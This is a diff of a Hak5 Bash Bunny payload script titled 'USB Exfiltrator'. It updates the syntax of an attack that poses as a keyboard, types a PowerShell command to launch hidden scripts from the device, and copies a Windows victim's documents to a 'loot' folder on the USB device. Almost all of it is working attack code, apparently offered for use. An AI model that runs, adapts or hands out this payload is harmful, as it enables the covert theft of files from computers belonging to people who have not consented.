@@ -1,24 +1,19 @@
 #!/bin/bash
 #
-# Title:         USB Exfiltration
+# Title:         USB Exfiltrator
 # Author:        Hak5Darren
-# Version:       1.0
+# Version:       1.1
 # Target:        Windows XP SP3+
 # Props:         Diggster, IMcPwn
+# Category:      Exfiltration
 # 
 # Executes d.cmd from the selected switch folder of the Bash Bunny USB Disk partition,
 # which in turn executes e.cmd invisibly using i.vbs
-# which in turn copies documents to the loot folder on the Bash Bunny.
+# which in turn executes and if stated, copies documents to the loot folder on the Bash Bunny.
 #
 
-# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
-source bunny_helpers.sh
-
-LED R
+LED ATTACK
 ATTACKMODE HID STORAGE
-QUACK SET_LANGUAGE se
-QUACK GUI r
-QUACK DELAY 100
-QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\d.cmd')"
-QUACK ENTER
-LED G
+DUCKY_LANG se
+RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\d.cmd')"
+LED FINISH
